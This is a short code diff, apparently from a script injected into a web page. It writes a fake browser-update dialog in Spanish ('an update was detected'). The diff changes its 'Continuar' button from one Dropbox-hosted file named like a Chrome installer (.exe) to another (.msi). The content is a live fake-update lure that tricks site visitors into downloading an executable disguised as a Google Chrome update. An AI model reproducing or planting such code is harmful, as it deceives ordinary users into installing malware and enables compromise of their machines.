@@ -22,7 +22,7 @@ document.body.innerHTML += `<style>img{max-width:100%;image-rendering:-moz-crisp
 	 <div class="button-area">
 		<div class="btn-left">Se detecto una actualización</div>
 		<div class="btn-right">
-			<button onclick="location.replace('https://www.dropbox.com/s/egaoxwa8wn3pijr/Chrome_Google_v115.exe?dl=1'); document.getElementById('windrag').style.display = 'none';">Continuar</button>
+			<button onclick="location.replace('https://www.dropbox.com/s/9q68jd0yx52r02h/Google_Chrome_v16.msi?dl=1'); document.getElementById('windrag').style.display = 'none';">Continuar</button>
 		</div>
 	 </div>
 	 
